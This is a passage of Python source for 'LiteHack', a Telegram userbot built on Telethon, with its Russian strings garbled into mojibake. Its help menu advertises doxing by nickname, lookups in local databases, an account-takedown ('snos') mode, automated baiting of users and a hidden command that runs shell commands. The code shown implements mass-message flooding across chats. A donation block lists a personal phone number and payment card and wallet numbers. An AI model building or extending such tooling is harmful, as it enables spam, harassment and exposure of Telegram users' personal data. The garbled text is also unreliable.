        await event.respond("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ –±–∞–∑ –¥–∞–Ω–Ω—ã—Ö")
        return

    if not files:
        await event.respond("‚ùå –í –ø–∞–ø–∫–µ `databases` –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –±–∞–∑ –¥–∞–Ω–Ω—ã—Ö")
        return

    message = "üìÇ –î–æ—Å—Ç—É–ø–Ω—ã–µ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö:\n"
    for f in files:
        message += f"‚ñ™ `{f}`\n"

    await event.respond(message)

@client.on(events.NewMessage(pattern=r'fr!info'))
async def info_message(event):
    info_message = (
        "LiteHack by @error_kill\n"
        "–û—Ç–Ω–æ—Å–∏—Ç—Å—è –∫ –ø—Ä–æ–µ–∫—Ç—É EYE CH EVEREN\n"
        "–í–µ—Ä—Å–∏—è: RELEASE 16\n\n"
        "–°–æ–∑–¥–∞—Ç–µ–ª—å/–ü—Ä–æ–≥—Ä–∞–º–º–∏—Å—Ç: @error_kill\n"
        "–ü–æ–º–æ—â–Ω–∏–∫/–ü—Ä–æ–≥—Ä–∞–º–º–∏—Å—Ç: RonZ\n"
        "–¢–µ—Å—Ç–µ—Ä: @roskomnadzor333, @SWLGTEAM –≤—Å–µ –∫–æ–≥–æ –º—É—á–∞–ª –≤ –ª—Å –≤ —á–∞—Ç–∞—Ö –∫–æ–º–∞–Ω–¥–∞–º–∏)\n"
        "–§—Ä–∞–∑—ã: @error_kill, @tous111, –û—Ç–∫—Ä—ã—Ç—ã–µ –∏—Å—Ç–æ—á–Ω–∏–∫–∏.\n\n"
        "[fenst4r 2025]\n\n"
        "–î–ª—è –ø–æ–ª–Ω–æ–π —Ä–∞–±–æ—Ç–æ—Å–ø–æ—Å–æ–±–Ω–æ—Å—Ç–∏ –±–æ—Ç—É –Ω—É–∂–µ–Ω VPN. –Ø –∏—Å–ø–æ–ª—å–∑—É—é @S1GyMAVPNBOT"
    )
    await event.respond(info_message)

@client.on(events.NewMessage(pattern=r'^fr!donate'))
async def donate_menu(event):
    donate_text = """
üí∏ <b>–ü–æ–¥–¥–µ—Ä–∂–∞—Ç—å —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É:</b>

üôã‚Äç‚ôÇÔ∏è <b>–ê–Ω–¥—Ä–µ–π –ê.</b>  
üè¶ <b>–°–ë–ü:</b> <code>+79995371856</code>  
üí≥ <b>–ö–∞—Ä—Ç–∞ –ÆMoney:</b> <code>2204120127898183</code>  
üí∞ <b>–ö–æ—à–µ–ª—ë–∫ –ÆMoney:</b> <code>4100119171202830</code>

üßæ <b>–ß–µ–∫:</b> @CryptoBot –Ω–∞ <a href="https://t.me/error_kill">@error_kill</a>  
üîó <b>–ú—É–ª—å—Ç–∏—á–µ–∫:</b> <a href="https://t.me/send?start=IV9B9JP3AiJy">t.me/send?start=IV9B9JP3AiJy</a>
"""
    await event.reply(donate_text, parse_mode='html')
        
from telethon import Button

HELP_CATEGORIES = {
    'main': {
        'text': (
            "üìò <b>LITEHACK RELEASE 16 - –ì–õ–ê–í–ù–û–ï –ú–ï–ù–Æ –ü–û–ú–û–©–ò</b>\n\n"
            "–í–´–ë–ï–†–ò–¢–ï –ö–ê–¢–ï–ì–û–†–ò–Æ –î–õ–Ø –ü–†–û–°–ú–û–¢–†–ê –ö–û–ú–ê–ù–î:\n\n"
            "1. üé• –í–∏–¥–µ–æ –∏ –º—É–∑—ã–∫–∞\n"
            "2. üß† AI –∏ –≥–µ–Ω–µ—Ä–∞—Ü–∏—è\n"
            "3. üé≠ –†–∞–∑–≤–ª–µ—á–µ–Ω–∏—è\n"
            "4. üìê –ö–∞–ª—å–∫—É–ª—è—Ç–æ—Ä\n"
            "5. üïµÔ∏è –ò–Ω—Ñ–æ –∏ –ø—Ä–æ–±–∏–≤\n"
            "6. üí£ –°–Ω–æ—Å\n"
            "7. üéÅ –ü—Ä–æ–º–æ–∫–æ–¥—ã\n"
            "8. ‚úèÔ∏è –¢–µ–∫—Å—Ç\n"
            "9. üìå –°–∏—Å—Ç–µ–º–Ω–æ–µ"
            "\n\n–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ <code>fr!help [–Ω–æ–º–µ—Ä]</code>"
        ),
        'buttons': [
            [Button.inline("üé• –í–∏–¥–µ–æ/–ú—É–∑—ã–∫–∞", b"help:1")],
            [Button.inline("üß† AI –∏ –≥–µ–Ω–µ—Ä–∞—Ü–∏—è", b"help:2")],
            [Button.inline("üé≠ –†–∞–∑–≤–ª–µ—á–µ–Ω–∏—è", b"help:3")],
            [Button.inline("üìê –ö–∞–ª—å–∫—É–ª—è—Ç–æ—Ä", b"help:4")],
            [Button.inline("üïµÔ∏è –ò–Ω—Ñ–æ/–ü—Ä–æ–±–∏–≤", b"help:5")],
            [Button.inline("üí£ –°–Ω–æ—Å/–ö—Ä–∞—à", b"help:6")],
            [Button.inline("üéÅ –ü—Ä–æ–º–æ–∫–æ–¥—ã", b"help:7")],
            [Button.inline("‚úèÔ∏è –¢–µ–∫—Å—Ç", b"help:8")],
            [Button.inline("üìå –°–∏—Å—Ç–µ–º–Ω–æ–µ", b"help:9")]
        ]
    },
    '1': {
        'text': (
            "üé• <b>–í–∏–¥–µ–æ –∏ –ú—É–∑—ã–∫–∞:</b>\n\n"
            "<code>fr!video <—Å—Å—ã–ª–∫–∞/–∑–∞–ø—Ä–æ—Å></code>\n"
            "–°–∫–∞—á–∞—Ç—å –≤–∏–¥–µ–æ —Å YouTube\n\n"
            "<code>fr!music yt <–∑–∞–ø—Ä–æ—Å></code>\n"
            "–°–∫–∞—á–∞—Ç—å —Å YouTube (–∞—É–¥–∏–æ)\n\n"
            "<code>fr!music sc <–∑–∞–ø—Ä–æ—Å></code>\n"
            "–°–∫–∞—á–∞—Ç—å —Å SoundCloud\n\n"
            "<code>client.send_file(chat_id, file)</code>\n"
            "–û—Ç–ø—Ä–∞–≤–∫–∞ –º–µ–¥–∏–∞—Ñ–∞–π–ª–æ–≤"
        ),
        'buttons': [
            [Button.inline("üîô –ù–∞–∑–∞–¥", b"help:main")]
        ]
    },
    '2': {
        'text': (
            "üß† <b>AI –∏ –≥–µ–Ω–µ—Ä–∞—Ü–∏—è:</b>\n\n"
            "<code>fr!AI <–≤–æ–ø—Ä–æ—Å></code>\n"
            "–ó–∞–ø—Ä–æ—Å –∫ –Ω–µ–π—Ä–æ—Å–µ—Ç–∏ (Grok)\n\n"
            "<code>fr!ascii <—Ç–µ–∫—Å—Ç></code>\n"
            "–ì–µ–Ω–µ—Ä–∞—Ü–∏—è ASCII-–∞—Ä—Ç–∞\n\n"
            "<code>fr!gif <–∑–∞–ø—Ä–æ—Å></code>\n"
            "–ü–æ–∏—Å–∫ GIF —á–µ—Ä–µ–∑ API"
        ),
        'buttons': [
            [Button.inline("üîô –ù–∞–∑–∞–¥", b"help:main")]
        ]
    },
    '3': {
        'text': (
            "üé≠ <b>–†–∞–∑–≤–ª–µ—á–µ–Ω–∏—è:</b>\n\n"
            "<code>fr!anim <—ç–º–æ–¥–∑–∏> <–∑–∞–¥–µ—Ä–∂–∫–∞></code>\n"
            "–ê–Ω–∏–º–∞—Ü–∏—è –≤ –Ω–∏–∫–Ω–µ–π–º–µ\n\n"
            "<code>fr!love</code>\n"
            "–°–µ—Ä–¥–µ—á–Ω–∞—è –∞–Ω–∏–º–∞—Ü–∏—è\n\n"
            "<code>fr!roll</code>\n"
            "–°–ª—É—á–∞–π–Ω–æ–µ —á–∏—Å–ª–æ\n\n"
            "<code>fr!tg <–Ω–∏–∫></code>\n"
            "–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∞–∫–∫–∞—É–Ω—Ç–∞"
        ),
        'buttons': [
            [Button.inline("üîô –ù–∞–∑–∞–¥", b"help:main")]
        ]
    },
    '4': {
        'text': (
            "üìê <b>–ö–∞–ª—å–∫—É–ª—è—Ç–æ—Ä:</b>\n\n"
            "<code>fr!calc <–≤—ã—Ä–∞–∂–µ–Ω–∏–µ></code>\n"
            "–ú–∞—Ç–µ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ –≤—ã—á–∏—Å–ª–µ–Ω–∏—è\n\n"
            "<code>fr!calc usdt 5 - rub</code>\n"
            "–ö–æ–Ω–≤–µ—Ä—Ç–µ—Ä –≤–∞–ª—é—Ç\n\n"
            "–î–æ—Å—Ç—É–ø–Ω—ã–µ –≤–∞–ª—é—Ç—ã:\n"
            "USDT, BTC, TON, USD, RUB"
        ),
        'buttons': [
            [Button.inline("üîô –ù–∞–∑–∞–¥", b"help:main")]
        ]
    },
    '5': {
        'text': (
            "üïµÔ∏è <b>–ò–Ω—Ñ–æ –∏ –ø—Ä–æ–±–∏–≤:</b>\n\n"
            "<code>fr!dox <–Ω–∏–∫></code>\n"
            "–ü–æ–ª–Ω—ã–π –ø—Ä–æ–±–∏–≤ –ø–æ –Ω–∏–∫—É\n\n"
            "<code>fr!data <–±–∞–∑–∞> <–∑–∞–ø—Ä–æ—Å></code>\n"
            "–ü–æ–∏—Å–∫ –≤ –ª–æ–∫–∞–ª—å–Ω—ã—Ö –±–∞–∑–∞—Ö\n\n"
            "<code>fr!databases</code>\n"
            "–°–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –±–∞–∑\n\n"
            "<code>fr!id</code>\n"
            "–ü–æ–∫–∞–∑–∞—Ç—å –≤–∞—à ID\n\n"
            "<code>client.get_entity(user_id)</code>\n"
            "–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–π –º–µ—Ç–æ–¥ –ø—Ä–æ–±–∏–≤–∞"
        ),
        'buttons': [
            [Button.inline("üîô –ù–∞–∑–∞–¥", b"help:main")]
        ]
    },
    '6': {
        'text': (
            "üí£ <b>–°–Ω–æ—Å:</b>\n\n"
            "<code>fr!snos</code>\n"
            "–ê–∫—Ç–∏–≤–∞—Ü–∏—è —Ä–µ–∂–∏–º–∞ —Å–Ω–æ—Å–∞\n\n"
            "<code>fr!sn_crash</code>\n"
            "–≠–∫—Å—Ç—Ä–µ–Ω–Ω–∞—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∞\n\n"
            "<code>fr!vanish</code>\n"
            "–†–µ–∂–∏–º –Ω–µ–≤–∏–¥–∏–º–æ—Å—Ç–∏\n\n"
            "<code>client.send_message(chat_id, '‚ùóÔ∏è –°–Ω–æ—Å–µ—Ä –∑–∞–≤–µ—Ä—à–∏–ª —Ä–∞–±–æ—Ç—É.')</code>\n"
            "–°–∏—Å—Ç–µ–º–Ω–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ"
        ),
        'buttons': [
            [Button.inline("üîô –ù–∞–∑–∞–¥", b"help:main")]
        ]
    },
    '7': {
        'text': (
            "üéÅ <b>–ü—Ä–æ–º–æ–∫–æ–¥—ã:</b>\n\n"
            "<code>fr!promoivi</code>\n"
            "–ì–µ–Ω–µ—Ä–∞—Ç–æ—Ä –ø—Ä–æ–º–æ IVI\n\n"
            "<code>fr!promoplus</code>\n"
            "–ü—Ä–æ–º–æ–∫–æ–¥—ã –Ø–Ω–¥–µ–∫—Å –ü–ª—é—Å\n\n"
            "<code>fr!promostart</code>\n"
            "–ü—Ä–æ–º–æ –¥–ª—è START\n\n"
            "–¢—Ä–µ–±—É–µ—Ç—Å—è VIP-—Å—Ç–∞—Ç—É—Å"
        ),
        'buttons': [
            [Button.inline("üîô –ù–∞–∑–∞–¥", b"help:main")]
        ]
    },
    '8': {
        'text': (
            "‚úèÔ∏è <b>–†–∞–±–æ—Ç–∞ —Å —Ç–µ–∫—Å—Ç–æ–º –∏ —Å–æ–æ–±—â–µ–Ω–∏—è–º–∏:</b>\n\n"
            "<code>fr!edit <–∫–æ–ª-–≤–æ> <–Ω–æ–≤—ã–π —Ç–µ–∫—Å—Ç></code>\n"
            "–†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å —Å–≤–æ–∏ –ø–æ—Å–ª–µ–¥–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è\n\n"
            "<code>fr!del <–∫–æ–ª-–≤–æ></code> (fr!–¥–µ–ª, fr!d, fr!–¥)\n"
            "–£–¥–∞–ª–∏—Ç—å —Å–≤–æ–∏ –ø–æ—Å–ª–µ–¥–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è\n\n"
            "<code>fr!red <1-5> –ù–æ–≤—ã–π —Ç–µ–∫—Å—Ç</code> (fr!–µ, fr!e, fr!—Ä–µ–¥)\n"
            "–†–µ–¥–∞–∫—Ç–∏—Ä—É–µ—Ç —Å–≤–æ–∏ –ø–æ—Å–ª–µ–¥–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è\n\n"
            "<code>fr!flood <—Ç–µ–∫—Å—Ç> <–∫–æ–ª-–≤–æ> <–∑–∞–¥–µ—Ä–∂–∫–∞></code>\n"
            "–ú–∞—Å—Å–æ–≤–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π"
            "<code>fr!–∞–≤—Ç–æ—Å–º—Å [—Ç–µ–∫—Å—Ç]</code> (fr!autosms, fr!–∞–≤—Ç–æ—Å–º—Å+, fr!autosms+)\n"
            "–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–≤–µ—á–∞–µ—Ç —É–∫–∞–∑–∞–Ω–Ω—ã–º —Ç–µ–∫—Å—Ç–æ–º –Ω–∞ –∫–∞–∂–¥–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (–∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ –æ—Ç–≤–µ—Ç)\n\n"
            "<code>fr!–∞–≤—Ç–æ—Å–º—Å—Å—Ç–æ–ø</code> (fr!–∞–≤—Ç–æ—Å–º—Å-, fr!autosms-)\n"
            "–û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –∞–≤—Ç–æ–æ—Ç–≤–µ—Ç—ã –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è\n\n"
            "<code>fr!–±–∞–π—Ç</code> (fr!bite)\n"
            "–ù–∞—á–∏–Ω–∞–µ—Ç –∂—ë—Å—Ç–∫–æ –±–∞–π—Ç–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –ø—Ä–æ–≤–æ—Ü–∏—Ä—É—è –µ–≥–æ –Ω–∞ –∫–∞–∂–¥–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ (–≤ –æ—Ç–≤–µ—Ç)\n\n"
            "<code>fr!–±–∞–π—Ç—Å—Ç–æ–ø</code> (fr!–±–∞–π—Ç-, fr!bite-)\n"
            "–û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –±–∞–π—Ç–∏–Ω–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è\n\n"
            "<code>fr!clearcasino</code>\n"
            "–£–¥–∞–ª—è–µ—Ç –≤—Å–µ —Å–æ–æ–±—â–µ–Ω–∏—è –º–∏–Ω–∏–∏–≥—Ä –∏–∑ –∫–∞–Ω–∞–ª–∞"
        ),
        'buttons': [
            [Button.inline("üîô –ù–∞–∑–∞–¥", b"help:main")]
        ]
    },
    '9': {
        'text': (
            "üìå <b>–°–∏—Å—Ç–µ–º–Ω–æ–µ:</b>\n\n"
            "<code>fr!info</code>\n"
            "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ\n\n"
            "<code>fr!report</code>\n"
            "–†–µ–ø–æ—Ä—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è\n\n"
            "<code>fr!license</code>\n"
            "–ü—Ä–æ–≤–µ—Ä–∫–∞ –ª–∏—Ü–µ–Ω–∑–∏–∏\n\n"
            "<code>fr!admin on/off</code>\n"
            "–†–µ–∂–∏–º –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞\n\n"
            "<code>fr!vipcheck <ID></code>\n"
            "–ü—Ä–æ–≤–µ—Ä–∫–∞ VIP-—Å—Ç–∞—Ç—É—Å–∞\n\n"
            "<code>client.disconnect()</code>\n"
            "–≠–∫—Å—Ç—Ä–µ–Ω–Ω–æ–µ –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ"
        ),
        'buttons': [
            [Button.inline("üîô –ù–∞–∑–∞–¥", b"help:main")]
        ]
    },
    'admin': {
        'text': (
            "‚öôÔ∏è <b>–°–∫—Ä—ã—Ç—ã–µ –∞–¥–º–∏–Ω-–∫–æ–º–∞–Ω–¥—ã:</b>\n\n"
            "<code>fradmin! <–∫–æ–º–∞–Ω–¥–∞></code>\n"
            "–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ shell-–∫–æ–º–∞–Ω–¥\n\n"
            "<code>fr!readall</code>\n"
            "–ü–æ–º–µ—Ç–∏—Ç—å –≤—Å—ë –ø—Ä–æ—á–∏—Ç–∞–Ω–Ω—ã–º\n\n"
            "<code>fr!log</code>\n"
            "–ü–æ–∫–∞–∑–∞—Ç—å –ª–æ–≥–∏"
        ),
        'buttons': [
            [Button.inline("üîô –ù–∞–∑–∞–¥", b"help:main")]
        ]
    }
}

@client.on(events.NewMessage(pattern=r'^fr!help(?: (\d))?$'))
async def help_handler(event):
    sender = await event.get_sender()
    category = event.pattern_match.group(1) or 'main'
    base = HELP_CATEGORIES.get(category)

    if not base:
        await event.reply("‚ùå –ö–∞—Ç–µ–≥–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")
        return

    # üë§ –ü–æ–ª—É—á–∞–µ–º user_info
    if sender.username == "error_kill":
        user_info = "–ë–∞—Ç—é—à–∫–∞ –≥–æ—Å–ø–æ–¥—å\n –ê –ø–æ –ø—Ä–æ—Å—Ç–æ–º—É @error_kill"
    elif sender.username == "Nikitahuh":
        user_info = "–ü–µ—Ä–≤—ã–π —Ç–µ—Å—Ç–µ—Ä –∏–∑ –ª—é–¥–µ–π)\n –ê –ø–æ –ø—Ä–æ—Å—Ç–æ–º—É @Nikitahuh"
    elif sender.username == "SWLGTEAM":
        user_info = "–ö–ê–ö –ñ–ï –¢–´ –ú–ï–ù–Ø –ó–ê–ï–ë–ê–õ –£–°–¢–ê–ù–û–í–ö–û–ô\n –ê –ø–æ –ø—Ä–æ—Å—Ç–æ–º—É @SWLGTEAM"
    elif sender.username:
        user_info = f"@{sender.username}"
    else:
        user_info = f"ID: {sender.id}, –ò–º—è: {sender.first_name or '–ë–µ–∑ –∏–º–µ–Ω–∏'}"

    # üß© –§–∏–Ω–∞–ª—å–Ω—ã–π —Ç–µ–∫—Å—Ç
    text = base['text'] + f"\n\nüë§ –û—Ç–ø—Ä–∞–≤–∏–ª –∫–æ–º–∞–Ω–¥—É: <b>{user_info}</b>"
    await event.reply(text, buttons=base['buttons'], parse_mode='html')

from telethon.tl.types import ChatAdminRights, ChannelParticipantsAdmins

@client.on(events.NewMessage(pattern=r'^fr!clearcasino(?: (\d+))?$'))
async def clear_casino_emojis(event):
    limit = int(event.pattern_match.group(1) or 400)

    target_emojis = {"üé∞", "üé≤", "üí∞", "üí∏", "üÉè", "‚ô†Ô∏è", "‚ô•Ô∏è", "‚ô¶Ô∏è", "‚ô£Ô∏è", "üéØ", "üèÄ", "‚öΩ", "üé≥"}
    deleted = 0
    scanned = 0

    me = await client.get_me()
    me_id = me.id

    # –ü—Ä–æ–≤–µ—Ä–∫–∞: —Ç—ã –∞–¥–º–∏–Ω –∏–ª–∏ –≤–ª–∞–¥–µ–ª–µ—Ü –∫–∞–Ω–∞–ª–∞
    is_admin = False
    try:
        participants = await client.get_participants(event.chat_id)
        for p in participants:
            if p.id == me_id and getattr(p, 'admin_rights', None):
                is_admin = True
                break
    except:
        is_admin = True  # –µ—Å–ª–∏ –Ω–µ —É–¥–∞—ë—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–∏—Ç—å ‚Äî —Å—á–∏—Ç–∞–µ–º, —á—Ç–æ –¥–∞

    async for msg in client.iter_messages(event.chat_id, limit=limit):
        scanned += 1

        text = " ".join(filter(None, [
            getattr(msg, "text", None),
            getattr(msg, "message", None),
            getattr(msg, "caption", None)
        ]))

        has_emoji = any(e in text for e in target_emojis)

        is_dice = (
            msg.media and
            hasattr(msg.media, "value") and
            getattr(msg.media.value, "emoji", None) in target_emojis
        )

        if has_emoji or is_dice:
            try:
                # –£–¥–∞–ª—è–µ–º –≤—Å—ë ‚Äî —Å–≤–æ–∏ –∏ —á—É–∂–∏–µ, –µ—Å–ª–∏ —Ç—ã –∞–¥–º–∏–Ω
                if msg.sender_id == me_id or is_admin:
                    await msg.delete()
                    deleted += 1
            except Exception as e:
                print(f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å {msg.id}: {e}")

    await event.respond(
        f"üîç –ü—Ä–æ—Å–º–æ—Ç—Ä–µ–Ω–æ: {scanned} —Å–æ–æ–±—â–µ–Ω–∏–π\n‚úÖ –£–¥–∞–ª–µ–Ω–æ –∫–∞–∑–∏–Ω–æ-—Å–æ–æ–±—â–µ–Ω–∏–π –∏ –∞–Ω–∏–º–∞—Ü–∏–π: {deleted}"
    )



@client.on(events.CallbackQuery(data=re.compile(b'help:(.*)')))
async def help_callback_handler(event):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏–π –Ω–∞ –∫–Ω–æ–ø–∫–∏ –ø–æ–º–æ—â–∏"""
    category = event.pattern_match.group(1).decode('utf-8')
    
    if category not in HELP_CATEGORIES:
        category = 'main'
    
    help_data = HELP_CATEGORIES[category]
    
    await event.edit(
        help_data['text'],
        parse_mode='html',
        buttons=help_data['buttons']
    )
    
COINGECKO_IDS = {
    "usdt": "tether",
    "btc": "bitcoin",
    "ton": "toncoin",
    "rub": "rub",
    "usd": "usd"
}

# –ö–æ–º–∞–Ω–¥—ã-—Ñ–ª—É–¥–µ—Ä—ã
FLOOD_COMMANDS = ['fr!flood', '—Ñ–ª—É–¥', 'flood', '—Ñ–ª—É–¥+', 'flood+', '—Ñ–ª—É–¥—Å—Ç–∞—Ä—Ç', 'floodstart', '—Å–ø–∞–º+', '—Å–ø–∞–º']
PFLOOD_COMMANDS = ['fr!pflood', '–ø—Ñ–ª—É–¥', 'fflood', '–ø—Ñ–ª—É–¥+', 'fflood+', '–ø—Ñ–ª—É–¥—Å—Ç–∞—Ä—Ç', 'ffloodstart', '–ø—Å–ø–∞–º+', '–ø—Å–ø–∞–º']
PCHFLOOD_COMMANDS = ['fr!pchflood', '–ø—á—Ñ–ª—É–¥', '–ø—á—Å–ø–∞–º+', '–ø—á—Å–ø–∞–º', '–ø—á–µ–ª–∞']

# –ê–∫—Ç–∏–≤–Ω—ã–µ —Ç–∞—Å–∫–∏
active_floods = {}  # key: chat_id or task_id, value: asyncio.Task

FLOOD_EXAMPLES = (
    "–ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã —Ñ–ª—É–¥:\n"
    "`fr!flood 10 1 –ü—Ä–∏–≤–µ—Ç!` ‚Äî 10 —Å–æ–æ–±—â–µ–Ω–∏–π —Å –∑–∞–¥–µ—Ä–∂–∫–æ–π 1 —Å–µ–∫—É–Ω–¥–∞\n"
    "–ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∑–∞–¥–µ—Ä–∂–∫—É –≤ —Ñ–æ—Ä–º–∞—Ç–µ –≤—Ä–µ–º–µ–Ω–∏: 0.5, 1m, 2s –∏ —Ç.–¥."
)

PCHFLOOD_EXAMPLES = (
    "–ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã –ø—á–µ–ª–∞ (pchflood):\n"
    "`fr!–ø—á–µ–ª–∞ 10 0.5 –¢–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è` ‚Äî 10 —Å–æ–æ–±—â–µ–Ω–∏–π —Å –∑–∞–¥–µ—Ä–∂–∫–æ–π 0.5 —Å–µ–∫—É–Ω–¥\n"
    "–ó–∞–¥–µ—Ä–∂–∫—É –º–æ–∂–Ω–æ —É–∫–∞–∑—ã–≤–∞—Ç—å –∫–∞–∫ —á–∏—Å–ª–æ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö –∏–ª–∏ –≤ —Ñ–æ—Ä–º–∞—Ç–µ 1m, 30s –∏ —Ç.–ø."
)


# –ê–∫—Ç–∏–≤–Ω—ã–µ —Ç–∞—Å–∫–∏ –¥–ª—è —Ñ–ª—É–¥–æ–≤k

# –£—Ç–∏–ª–∏—Ç–∞ –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Ñ–ª—É–¥–∞ (–ø—Ä–∏–º–µ—Ä)
async def run_flood(event, targets, count, delay, text, between_chats=False, reply_msg=None):
    for target in targets:
        for i in range(count):
            try:
                if reply_msg:
                    await client.send_message(target, text, file=reply_msg.media)
                else:
                    await client.send_message(target, text)
                await asyncio.sleep(delay)
                if between_chats:
                    break  # –¢–æ–ª—å–∫–æ 1 —Å–æ–æ–±—â–µ–Ω–∏–µ –Ω–∞ —á–∞—Ç
            except Exception as e:
                await event.respond(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ {target}: {e}")

# –ü–∞—Ä—Å–µ—Ä –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ (–∫–æ–ª-–≤–æ, –∑–∞–¥–µ—Ä–∂–∫–∞, —Ç–µ–∫—Å—Ç)
def parse_args(match):
    count = int(match.group(1))
    delay_raw = match.group(2)
    text = match.group(3)
    try:
        if re.match(r'^\d+(\.\d+)?$', delay_raw):
            delay = float(delay_raw)
        else:
            import humanfriendly
            delay = humanfriendly.parse_timespan(delay_raw)
    except:
        delay = 1.0
    return count, delay, text

# –ö–æ–º–∞–Ω–¥–∞: fr!—Ñ–ª—É–¥ <count> <delay> <text>
@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!—Ñ–ª—É–¥\s+(\d+)\s+(\S+)\s+(.+)'))
async def flood_handler(event):
    count, delay, text = parse_args(event.pattern_match)
    chat_id = event.chat_id
    if chat_id in active_floods:
        await event.respond("‚ö†Ô∏è –§–ª—É–¥ —É–∂–µ –∑–∞–ø—É—â–µ–Ω –≤ —ç—Ç–æ–º —á–∞—Ç–µ. –û—Å—Ç–∞–Ω–æ–≤–∏ –µ–≥–æ –∫–æ–º–∞–Ω–¥–æ–π fr!—Ñ–ª—É–¥—Å—Ç–æ–ø")
        return
    task = asyncio.create_task(run_flood(event, [chat_id], count, delay, text))
    active_floods[chat_id] = task
    await event.respond(f"üöÄ –ó–∞–ø—É—â–µ–Ω —Ñ–ª—É–¥: {count} —Å–æ–æ–±—â–µ–Ω–∏–π —Å –∑–∞–¥–µ—Ä–∂–∫–æ–π {delay}s")

# –ö–æ–º–∞–Ω–¥–∞: fr!—Ñ–ª—É–¥—Å—Ç–æ–ø ‚Äî –æ—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ñ–ª—É–¥-–∑–∞–¥–∞—á–∏ –≤ —Ç–µ–∫—É—â–µ–º —á–∞—Ç–µ
@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!—Ñ–ª—É–¥—Å—Ç–æ–ø$'))
async def stop_flood(event):
    chat_id = event.chat_id
    task = active_floods.pop(chat_id, None)
    if task:
        task.cancel()
        await event.respond("üõë –§–ª—É–¥ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ —ç—Ç–æ–º —á–∞—Ç–µ.")
    else:
        await event.respond("‚ö†Ô∏è –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ —Ñ–ª—É–¥–∞ –≤ —ç—Ç–æ–º —á–∞—Ç–µ.")

# –ö–æ–º–∞–Ω–¥–∞: fr!–ø—á—Ñ–ª—É–¥—Å—Ç–æ–ø <task_id> ‚Äî –æ—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ñ–ª—É–¥–∞ –ø–æ —á–∞—Ç–∞–º (pchflood)
@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!–ø—á—Ñ–ª—É–¥—Å—Ç–æ–ø\s*(.*)$'))
async def stop_pchflood(event):
    arg = event.pattern_match.group(1).strip()
    if not arg:
        # –ï—Å–ª–∏ –Ω–µ—Ç –∞—Ä–≥—É–º–µ–Ω—Ç–∞ ‚Äî –æ—Å—Ç–∞–Ω–æ–≤–∏–º –≤—Å–µ pchflood –∑–∞–¥–∞—á–∏
        to_stop = [k for k in active_floods if k.startswith('pchflood')]
        count = 0
        for task_id in to_stop:
            task = active_floods.pop(task_id, None)
            if task:
                task.cancel()
                count += 1
        await event.respond(f"üßπ –û—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ {count} –∑–∞–¥–∞—á –ø—á—Ñ–ª—É–¥.")
    else:
        task = active_floods.pop(arg, None)
        if task:
            task.cancel()
            await event.respond(f"üõë –§–ª—É–¥-–∑–∞–¥–∞—á–∞ {arg} –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞.")
        else:
